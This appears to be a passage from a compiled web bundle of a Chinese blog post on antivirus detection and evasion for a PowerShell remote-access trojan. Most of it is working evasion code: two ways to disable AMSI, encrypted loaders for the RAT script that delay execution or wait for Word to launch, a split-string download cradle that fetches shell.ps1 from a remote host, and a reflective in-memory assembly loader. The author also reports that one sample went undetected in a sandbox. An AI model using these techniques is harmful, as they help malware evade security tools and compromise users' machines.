则是动态的检测手段, 它会检测程序执行时的具体行为, 如系统调用、文件访问等，来检测恶意活动</li></ul></blockquote><hr><p>行为监测可以有效针对木马加壳行为, 例如上述 <code>RATSample.ps1</code> 的各种加壳变种加载到内存后最后都执行的 RATSample 中一样的代码, 可以有效回归原本的检测手段, 例如检测包含 <code>New-Object System.Net.Sockets.TCPClient</code> 和 <code>iex</code> 命令组合的行为</p><hr><h3 id="amsi" tabindex="-1"><a class="header-anchor" href="#amsi"><span>AMSI</span></a></h3>',36),y={href:"https://xz.aliyun.com/t/11097",target:"_blank",rel:"noopener noreferrer"},w=t(`<p>AMSI(Antimalware Scan Interface) 是微软提供的一个标准化接口，旨在增强恶意软件和其他威胁的检测能力，特别是对于那些运行在Windows操作系统上的脚本和解释型代码</p><blockquote><p>Win10 以及 WindowsSever2016 及之后的版本支持 AMSI</p><p>低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020527019.png" alt="image-20240102052708985"></p></blockquote><p>AMSI使得应用程序(如PowerShell、VBScript、JavaScript等) 可以将执行前的代码发送到安装的防病毒软件进行扫描</p><hr><h4 id="amsi-bypass" tabindex="-1"><a class="header-anchor" href="#amsi-bypass"><span>AMSI Bypass</span></a></h4><p>通过修改内存中的AMSI相关数据，或者利用AMSI实现中的漏洞可以实现 bypass AMSI 从而缓解检测</p><hr><h4 id="改注册表禁用-amsi" tabindex="-1"><a class="header-anchor" href="#改注册表禁用-amsi"><span>改注册表禁用 AMSI</span></a></h4><p>设置注册表<code>HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable</code>设置为 0，以禁用 AMSI。</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token function">Remove-Item</span> <span class="token operator">-</span>Path <span class="token string">&quot;HKLM:\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable&quot;</span> <span class="token operator">-</span>Recurse
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h4 id="通过命名空间接口关闭amsi" tabindex="-1"><a class="header-anchor" href="#通过命名空间接口关闭amsi"><span>通过命名空间接口关闭AMSI</span></a></h4><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">&#39;amsiInitFailed&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;NonPubilc,Static&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol><li><p><code>[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;)</code></p><ul><li><p>获取<code>System.Management.Automation</code>命名空间下的<code>AmsiUtils</code>类的类型信息。</p><p><code>AmsiUtils</code>是处理AMSI相关操作的内部类。</p></li></ul></li><li><p><code>GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;)</code></p><ul><li><p>获取<code>AmsiUtils</code>类中名为<code>amsiInitFailed</code>的字段。</p><p>这个字段是一个私有(NonPublic) 静态(Static) 字段，用于指示AMSI是否初始化失败。</p></li></ul></li><li><p><code>SetValue($null,$true)</code></p><ul><li><p>将<code>amsiInitFailed</code>字段的值设置为<code>$true</code>，意味着伪造AMSI初始化失败的状态。</p><p>这样做的效果是使AMSI停止工作，因为系统认为AMSI无法正确初始化。</p></li></ul></li></ol><hr><h3 id="时间延迟执行-1" tabindex="-1"><a class="header-anchor" href="#时间延迟执行-1"><span>时间延迟执行</span></a></h3><p>在脚本中加入延迟执行的代码，使恶意行为不会立即发生，这样在静态分析时看起来不会有恶意行为&#39;</p><p>例如结合前面自定义加密的方案以及 <code>Start-Sleep -Seconds 100 </code> 来做时延</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token variable">$originalScript</span> = <span class="token function">Get-Content</span> <span class="token operator">-</span>Path <span class="token string">&quot;../../RATSample.ps1&quot;</span> <span class="token operator">-</span>Raw
<span class="token function">Write-Host</span> <span class="token variable">$originalScript</span>
<span class="token variable">$encryptedScript</span> = <span class="token punctuation">(</span><span class="token variable">$originalScript</span><span class="token punctuation">.</span>ToCharArray<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">ForEach-Object</span> <span class="token punctuation">{</span>
    <span class="token variable">$asciiValue</span> = <span class="token namespace">[int]</span><span class="token namespace">[char]</span><span class="token variable">$_</span> <span class="token operator">+</span> 1
    <span class="token variable">$asciiValue</span><span class="token punctuation">.</span>ToString<span class="token punctuation">(</span><span class="token string">&quot;D3&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">-join</span> <span class="token string">&#39;&#39;</span>
<span class="token variable">$decryptionScript</span> = @<span class="token string">&quot;
\`<span class="token variable">$encryptedScript</span> = &#39;<span class="token variable">$encryptedScript</span>&#39;
Start-Sleep -Seconds 100  
\`<span class="token variable">$decryptedScript</span> = &#39;&#39;
for (\`<span class="token variable">$i</span> = 0; \`<span class="token variable">$i</span> -lt \`<span class="token variable">$encryptedScript</span>.Length; \`<span class="token variable">$i</span>+=3) {
    \`<span class="token variable">$asciiValue</span> = [int]::Parse(\`<span class="token variable">$encryptedScript</span>.Substring(\`<span class="token variable">$i</span>, 3)) - 1
    \`<span class="token variable">$decryptedScript</span> += [char]\`<span class="token variable">$asciiValue</span>
}
Start-Sleep -Seconds 100  
Invoke-Expression \`<span class="token variable">$decryptedScript</span>
&quot;</span>@

<span class="token variable">$decryptionScript</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>FilePath <span class="token string">&quot;EncryptedRAT.ps1&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,19),q={href:"https://s.threatbook.com/report/file/da54f8b59c4643f2248c77d1263b98ef036fe7fa9946b0d05b22bbdc72dfc98f",target:"_blank",rel:"noopener noreferrer"},_=t(`<p>微步是无检出的</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401151815161.png" alt="image-20240115181538678"></p><hr><h3 id="条件触发" tabindex="-1"><a class="header-anchor" href="#条件触发"><span>条件触发</span></a></h3><p>设计脚本在满足某些特定条件(如特定的系统配置、日期或用户活动) 时才执行恶意操作</p><p>例如只有当 word 启动时才执行恶意代码</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token variable">$originalScript</span> = <span class="token function">Get-Content</span> <span class="token operator">-</span>Path <span class="token string">&quot;../RATSample.ps1&quot;</span> <span class="token operator">-</span>Raw
<span class="token variable">$encryptedScript</span> = <span class="token punctuation">(</span><span class="token variable">$originalScript</span><span class="token punctuation">.</span>ToCharArray<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">ForEach-Object</span> <span class="token punctuation">{</span>
        <span class="token variable">$asciiValue</span> = <span class="token namespace">[int]</span><span class="token namespace">[char]</span><span class="token variable">$_</span> <span class="token operator">+</span> 1
        <span class="token variable">$asciiValue</span><span class="token punctuation">.</span>ToString<span class="token punctuation">(</span><span class="token string">&quot;D3&quot;</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">-join</span> <span class="token string">&#39;&#39;</span>
<span class="token variable">$decryptionScript</span> = @<span class="token string">&quot;
\`<span class="token variable">$wordRunning</span> = \`<span class="token boolean">$false</span>
while (-not \`<span class="token variable">$wordRunning</span>) {
    if (Get-Process -Name &quot;</span>WINWORD<span class="token string">&quot; -ErrorAction SilentlyContinue) {
        \`<span class="token variable">$wordRunning</span> = \`<span class="token boolean">$true</span>
    }else {
        Start-Sleep -Seconds 10
    }
}
\`<span class="token variable">$encryptedScript</span> = &#39;<span class="token variable">$encryptedScript</span>&#39;
\`<span class="token variable">$decryptedScript</span> = &#39;&#39;
for (\`<span class="token variable">$i</span> = 0; \`<span class="token variable">$i</span> -lt \`<span class="token variable">$encryptedScript</span>.Length; \`<span class="token variable">$i</span>+=3) {
    \`<span class="token variable">$asciiValue</span> = [int]::Parse(\`<span class="token variable">$encryptedScript</span>.Substring(\`<span class="token variable">$i</span>, 3)) - 1
    \`<span class="token variable">$decryptedScript</span> += [char]\`<span class="token variable">$asciiValue</span>
}
Invoke-Expression \`<span class="token variable">$decryptedScript</span>
&quot;</span>@

<span class="token variable">$decryptionScript</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>FilePath <span class="token string">&quot;ConditionTriggeredEncryptedRAT.ps1&quot;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h3 id="行为免杀" tabindex="-1"><a class="header-anchor" href="#行为免杀"><span>行为免杀</span></a></h3>`,9),x={href:"https://www.freebuf.com/articles/system/227467.html",target:"_blank",rel:"noopener noreferrer"},C=t(`<div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code>powershell <span class="token operator">-</span>NoExit <span class="token string">&quot;<span class="token variable">$c1</span>=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;<span class="token variable">$c2</span>=&#39;123(&#39;&#39;http://xx.x.x/shell.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX (<span class="token variable">$c1</span>+<span class="token variable">$c2</span>)&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p>没感觉到具体用处, 放个 TODO</p></blockquote><hr><h3 id="使用冷门方法实现" tabindex="-1"><a class="header-anchor" href="#使用冷门方法实现"><span>使用冷门方法实现</span></a></h3><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token variable">$wm</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">;</span>
<span class="token variable">$base64</span> = <span class="token variable">$wm</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token string">&quot;xxx&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 将下载的数据加载到内存中</span>
<span class="token variable">$asm</span> = <span class="token namespace">[Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$asm</span><span class="token punctuation">.</span>EntryPoint<span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span>@<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>.EntryPoint</code> 是 <code>System.Reflection.Assembly</code> 类的一个属性，它指向程序集中的入口点。对于.NET程序来说，这通常是Main方法, 是程序开始执行的地方。</li><li><code>.Invoke($null,@())</code><ul><li><code>($null,@())</code> 是 <code>.Invoke</code> 方法的参数。这里有两个参数： <ul><li><code>$null</code>：表示Invoke方法被调用的对象。因为大多数.NET程序的入口点Main方法是静态的(即它不依赖于类的实例) ，所以这里使用$null。如果入口点是一个实例方法(非静态) ，这里将需要一个该类的实例。</li><li><code>@()</code>：传递给Main方法的参数数组。在这个例子中，使用空数组@()，表示没有参数被传递。如果Main方法期望参数，它们将在这里提供。</li></ul></li></ul></li></ul><hr><h3 id="拷贝重命名-powershell" tabindex="-1"><a class="header-anchor" href="#拷贝重命名-powershell"><span>拷贝重命名 powershell</span></a></h3>`,8),D={href:"https://blog.csdn.net/qq_50854790/article/details/124705800",target:"_blank",rel:"noopener noreferrer"},F=t(`<div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token function">copy</span> C:\\Windows\\System32\\WindowsPowerShell\\v1<span class="token punctuation">.</span>0\\powershell<span class="token punctuation">.</span>exe bypass<span class="token punctuation">.</span>txt
bypass<span class="token punctuation">.</span>txt <span class="token function">IEX</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>现在基本上没什么用了</p></blockquote><hr><h2 id="云基础分析" tabindex="-1"><a class="header-anchor" href="#云基础分析"><span>云基础分析</span></a></h2><p>许多现代杀软使用云技术来提高恶意软件检测的能力</p><p>云服务器可以存储大量的病毒信息, 提供实时更新, 并允许快速对新出现的威胁做出反应</p><p>当程序出现可疑行为但是不足以确定是病毒木马时, 为了降低误报率, 提升用户体验, 杀软一般会放行, 然后将对应的可疑文件上传到服务器进行分析; 当一个用户设备遇到新型威胁时, 这个信息可以被快速共享给其他用户, 提升整个网络的安全水平</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280207848.jpeg" alt="7.png"></p><hr><h2 id="ai分析" tabindex="-1"><a class="header-anchor" href="#ai分析"><span>AI分析</span></a></h2><p>杀软公司可以依托自己庞大的病毒样本库训练病毒查杀模型~</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280210569.jpeg" alt="8.png"></p><hr>`,13);function N(I,T){const s=p("ExternalLinkIcon");return i(),o("div",null,[r,a("blockquote",null,[a("p",null,[a("a",u,[n("相爱相杀：杀毒软件6种主流的查杀原理 - FreeBuf网络安全行业门户"),e(s)])])]),d,a("p",null,[n("可以使用 "),a("a",k,[n("VirusTotal - Home --- VirusTotal - 主页"),e(s)]),n(" 来判断文件是否为病毒文件")]),v,a("p",null,[a("a",m,[n("样本报告-微步在线云沙箱 (threatbook.com)"),e(s)])]),h,a("p",null,[a("a",b,[n("样本报告-微步在线云沙箱 (threatbook.com)"),e(s)])]),E,a("p",null,[a("a",g,[n("样本报告-微步在线云沙箱 (threatbook.com)"),e(s)])]),A,a("p",null,[a("a",f,[n("样本报告-微步在线云沙箱 (threatbook.com)"),e(s)])]),B,a("p",null,[a("a",S,[n("样本报告-微步在线云沙箱 (threatbook.com)"),e(s)])]),$,a("blockquote",null,[a("p",null,[a("a",y,[n("amsi绕过总结 - 先知社区 (aliyun.com)"),e(s)])])]),w,a("p",null,[a("a",q,[n("样本报告-微步在线云沙箱 (threatbook.com)"),e(s)])]),_,a("blockquote",null,[a("p",null,[a("a",x,[n("远控免杀从入门到实践(6)-代码篇-Powershell - FreeBuf网络安全行业门户"),e(s)])])]),C,a("blockquote",null,[a("p",null,[a("a",D,[n("Powershell免杀-CSDN博客"),e(s)])])]),F])}const M=l(c,[["render",N],["__file","从基础的RAT出发梳理一些常见的查杀与免杀技术.html.vue"]]),O=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E4%BB%8E%E5%9F%BA%E7%A1%80%E7%9A%84RAT%E5%87%BA%E5%8F%91%E6%A2%B3%E7%90%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9F%A5%E6%9D%80%E4%B8%8E%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF.html","title":"杀毒与免杀","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"木马概述","slug":"木马概述","link":"#木马概述","children":[{"level":3,"title":"木马的定义","slug":"木马的定义","link":"#木马的定义","children":[]},{"level":3,"title":"木马感染的过程","slug":"木马感染的过程","link":"#木马感染的过程","children":[]},{"level":3,"title":"木马示例","slug":"木马示例","link":"#木马示例","children":[]}]},{"level":2,"title":"特征码查杀","slug":"特征码查杀","link":"#特征码查杀","children":[{"level":3,"title":"加壳","slug":"加壳","link":"#加壳","children":[]}]},{"level":2,"title":"启发式分析","slug":"启发式分析","link":"#启发式分析","children":[]},{"level":2,"title":"沙盒分析","slug":"沙盒分析","link":"#沙盒分析","children":[]},{"level":2,"title":"行为监测","slug":"行为监测","link":"#行为监测","children":[{"level":3,"title":"AMSI","slug":"amsi","link":"#amsi","children":[]},{"level":3,"title":"时间延迟执行","slug":"时间延迟执行-1","link":"#时间延迟执行-1","children":[]},{"level":3,"title":"条件触发","slug":"条件触发","link":"#条件触发","children":[]},{"level":3,"title":"行为免杀","slug":"行为免杀","link":"#行为免杀","children":[]},{"level":3,"title":"使用冷门方法实现","slug":"使用冷门方法实现","link":"#使用冷门方法实现","children":[]},{"level":3,"title":"拷贝重命名 powershell","slug":"拷贝重命名-powershell","link":"#拷贝重命名-powershell","children":[]}]},{"level":2,"title":"云基础分析","slug":"云基础分析","link":"#云基础分析","children":[]},{"level":2,"title":"AI分析","slug":"ai分析","link":"#ai分析","children":[]}],"git":{"createdTime":1715827527000,"updatedTime":1715827527000,"contributors":[{"name":"Ayusummer","email":"ayusummer233@gmail.com","commits":1}]},"readingTime":{"minutes":14.47,"words":4342},"filePathRelative":"网络安全/端点安全/Malware/从基础的RAT出发梳理一些常见的查杀与免杀技术.md","localizedDate":"2024年5月16日","excerpt":"\\n<hr>\\n<ul>\\n<li><a href=\\"#%E6%9D%80%E6%AF%92%E4%B8%8E%E5%85%8D%E6%9D%80\\">杀毒与免杀</a>\\n<ul>\\n<li><a href=\\"#%E6%9C%A8%E9%A9%AC%E6%A6%82%E8%BF%B0\\">木马概述</a>\\n<ul>\\n<li><a href=\\"#%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9A%E4%B9%89\\">木马的定义</a></li>\\n<li><a href=\\"#%E6%9C%A8%E9%A9%AC%E6%84%9F%E6%9F%93%E7%9A%84%E8%BF%87%E7%A8%8B\\">木马感染的过程</a></li>\\n<li><a href=\\"#%E6%9C%A8%E9%A9%AC%E7%A4%BA%E4%BE%8B\\">木马示例</a></li>\\n</ul>\\n</li>\\n<li><a href=\\"#%E7%89%B9%E5%BE%81%E7%A0%81%E6%9F%A5%E6%9D%80\\">特征码查杀</a>\\n<ul>\\n<li><a href=\\"#%E5%8A%A0%E5%A3%B3\\">加壳</a>\\n<ul>\\n<li><a href=\\"#%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86\\">代码混淆</a></li>\\n<li><a href=\\"#%E7%BC%96%E7%A0%81%E6%88%96%E5%8A%A0%E5%AF%86\\">编码或加密</a>\\n<ul>\\n<li><a href=\\"#base64%E7%BC%96%E7%A0%81\\">Base64编码</a></li>\\n<li><a href=\\"#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8A%A0%E5%AF%86\\">自定义加密</a></li>\\n</ul>\\n</li>\\n<li><a href=\\"#%E5%A1%AB%E5%85%85%E5%90%88%E6%B3%95%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4\\">填充合法的系统命令</a></li>\\n<li><a href=\\"#%E5%88%A9%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1\\">利用第三方服务</a></li>\\n<li><a href=\\"#%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C\\">时间延迟执行</a></li>\\n<li><a href=\\"#%E5%88%86%E5%89%B2%E5%92%8C%E5%88%86%E6%95%A3%E4%BB%A3%E7%A0%81\\">分割和分散代码</a></li>\\n</ul>\\n</li>\\n</ul>\\n</li>\\n<li><a href=\\"#%E5%90%AF%E5%8F%91%E5%BC%8F%E5%88%86%E6%9E%90\\">启发式分析</a></li>\\n<li><a href=\\"#%E6%B2%99%E7%9B%92%E5%88%86%E6%9E%90\\">沙盒分析</a></li>\\n<li><a href=\\"#%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%B5%8B\\">行为监测</a>\\n<ul>\\n<li><a href=\\"#amsi\\">AMSI</a>\\n<ul>\\n<li><a href=\\"#amsi-bypass\\">AMSI Bypass</a></li>\\n<li><a href=\\"#%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%A6%81%E7%94%A8-amsi\\">改注册表禁用 AMSI</a></li>\\n<li><a href=\\"#%E9%80%9A%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%8E%A5%E5%8F%A3%E5%85%B3%E9%97%ADamsi\\">通过命名空间接口关闭AMSI</a></li>\\n</ul>\\n</li>\\n<li><a href=\\"#%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C-1\\">时间延迟执行</a></li>\\n<li><a href=\\"#%E6%9D%A1%E4%BB%B6%E8%A7%A6%E5%8F%91\\">条件触发</a></li>\\n<li><a href=\\"#%E8%A1%8C%E4%B8%BA%E5%85%8D%E6%9D%80\\">行为免杀</a></li>\\n<li><a href=\\"#%E4%BD%BF%E7%94%A8%E5%86%B7%E9%97%A8%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0\\">使用冷门方法实现</a></li>\\n<li><a href=\\"#%E6%8B%B7%E8%B4%9D%E9%87%8D%E5%91%BD%E5%90%8D-powershell\\">拷贝重命名 powershell</a></li>\\n</ul>\\n</li>\\n<li><a href=\\"#%E4%BA%91%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90\\">云基础分析</a></li>\\n<li><a href=\\"#ai%E5%88%86%E6%9E%90\\">AI分析</a></li>\\n</ul>\\n</li>\\n</ul>"}');export{M as comp,O as data};
